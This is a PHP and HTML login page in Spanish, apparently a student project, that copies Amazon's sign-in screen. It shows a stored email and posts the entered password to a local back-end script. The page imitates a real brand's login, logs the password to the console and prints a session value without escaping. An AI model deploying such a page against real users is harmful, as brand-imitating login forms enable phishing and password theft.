<?php
session_start();

// Suponiendo que obtienes el email de algún lugar y lo guardas en $_SESSION['email']
$_SESSION['email'] = "72226067@continental.edu.pe";
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Amazon Login</title>
  <link rel="stylesheet" href="css/login2.css">
  <script>
    document.addEventListener("DOMContentLoaded", function() {
      var storedEmail = localStorage.getItem("email");
      if (storedEmail) {
        var emailElement = document.querySelector(".email");
        emailElement.textContent = storedEmail;
        document.getElementById("hidden-email").value = storedEmail; // Guarda el correo en un input oculto
        // Guardar el correo en la sesión (opcional si lo necesitas en JS)
        sessionStorage.setItem('email', storedEmail);
      }
    });

    function validarFormulario() {
      var email = document.getElementById('hidden-email').value;
      var password = document.getElementsByName('password')[0].value;

      console.log("Email: " + email);
      console.log("Password: " + password);

      // Puedes agregar más validaciones aquí si es necesario

      return true; // Devuelve true para enviar el formulario
    }
  </script>
</head>
<body>
  <section class="flex1">
    <div class="logo">
      <img src="imagenes/logo2.png" alt="Amazon Logo"/>
    </div>
  </section>
  <div class="container">
    <h1>Iniciar sesión</h1>
    <div class="email-container">
      <span class="email"><?php echo $_SESSION['email']; ?></span>
      <a href="login.html">Cambiar</a>
    </div>
    <div class="olvidaste">
      <a>Contraseña</a>
      <a href="">¿Olvidaste tu contraseña?</a>
    </div>
    <form action="BACK/estadoverificacion.php" method="post" onsubmit="return validarFormulario()">
      <div class="input-group">
        <input type="hidden" name="email" id="hidden-email" value="<?php echo $_SESSION['email']; ?>">
        <input type="password" name="password" required>
      </div>
      <button type="submit">Iniciar sesión</button>
    </form>
    <div class="remember-me">
      <input type="checkbox" id="remember-me">
      <label for="remember-me">Recuérdame.</label>
      <a href="#" class="a-popover-trigger">Detalles</a>
    </div>
  </div>
</body>
</html>
